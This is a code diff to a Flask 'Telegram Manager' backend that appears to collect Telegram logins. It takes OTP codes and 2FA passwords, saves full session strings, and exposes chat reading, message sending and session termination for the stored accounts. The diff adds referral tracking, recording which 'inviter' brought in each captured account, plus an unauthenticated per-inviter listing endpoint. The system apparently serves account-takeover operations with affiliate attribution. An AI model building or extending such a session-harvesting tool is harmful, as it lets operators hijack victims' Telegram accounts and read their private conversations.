@@ -43,6 +43,10 @@ def load_accounts():
                 content = f.read()
                 if content.strip():
                     accounts = json.loads(content)
+                    # Ensure each account has 'invited_by' field (backward compatibility)
+                    for acc in accounts:
+                        if 'invited_by' not in acc:
+                            acc['invited_by'] = None
                 else:
                     accounts = []
         else:
@@ -99,6 +103,11 @@ def dash():
 def all_sessions():
     return send_file('all.html')
 
+# NEW: User dashboard route
+@app.route('/user-dashboard')
+def user_dashboard():
+    return send_file('user-dashboard.html')
+
 # -------------------- API ROUTES --------------------
 
 # Get all accounts
@@ -111,6 +120,26 @@ def get_accounts():
             'phone': acc.get('phone', ''),
             'name': acc.get('name', 'Unknown')
         })
+    return jsonify({'success': True, 'accounts': formatted})
+
+# NEW: Get accounts invited by a specific user
+@app.route('/api/accounts-by-inviter', methods=['POST'])
+def accounts_by_inviter():
+    data = request.json
+    inviter = data.get('inviter')
+    if not inviter:
+        return jsonify({'success': False, 'error': 'Inviter ID required'})
+    
+    # Convert to string for comparison (inviter can be string or int)
+    inviter_str = str(inviter)
+    filtered = [acc for acc in accounts if str(acc.get('invited_by')) == inviter_str]
+    
+    formatted = [{
+        'id': acc['id'],
+        'phone': acc.get('phone', ''),
+        'name': acc.get('name', 'Unknown')
+    } for acc in filtered]
+    
     return jsonify({'success': True, 'accounts': formatted})
 
 # Send OTP
@@ -150,13 +179,14 @@ def add_account():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Verify code
+# Verify code (UPDATED to accept inviter)
 @app.route('/api/verify-code', methods=['POST'])
 def verify_code():
     data = request.json
     code = data.get('code')
     session_id = data.get('session_id')
     password = data.get('password', '')
+    inviter = data.get('inviter')  # NEW: optional inviter ID
     
     if not code or not session_id:
         return jsonify({'success': False, 'error': 'Missing code or session'})
@@ -188,11 +218,13 @@ def verify_code():
             if accounts:
                 new_id = max([a['id'] for a in accounts]) + 1
             
+            # NEW: include inviter in account data
             new_account = {
                 'id': new_id,
                 'phone': me.phone or session_data['phone'],
                 'name': me.first_name or 'User',
-                'session': client.session.save()
+                'session': client.session.save(),
+                'invited_by': inviter  # store inviter (None if not provided)
             }
             
             accounts.append(new_account)
@@ -670,16 +702,11 @@ def health_check():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     print('\n' + '='*60)
-    print('📱 TELEGRAM MANAGER - COMPLETE VERSION')
+    print('📱 TELEGRAM MANAGER - WITH INVITE SYSTEM')
     print('='*60)
     print(f'✅ Port: {port}')
     print(f'✅ Accounts loaded: {len(accounts)}')
-    print(f'✅ Endpoints:')
-    print(f'   - Page Routes: /, /login, /dashboard, /dash, /all')
-    print(f'   - Account API: /api/accounts, /api/add-account, /api/verify-code')
-    print(f'   - Chat API: /api/get-messages, /api/send-message')
-    print(f'   - Session API: /api/get-sessions, /api/terminate-session, /api/terminate-sessions')
-    print(f'   - Debug: /api/debug/chats/<id>, /api/health')
+    print(f'✅ New endpoints: /api/accounts-by-inviter, /user-dashboard')
     print('='*60 + '\n')
     
     app.run(host='0.0.0.0', port=port, debug=False)
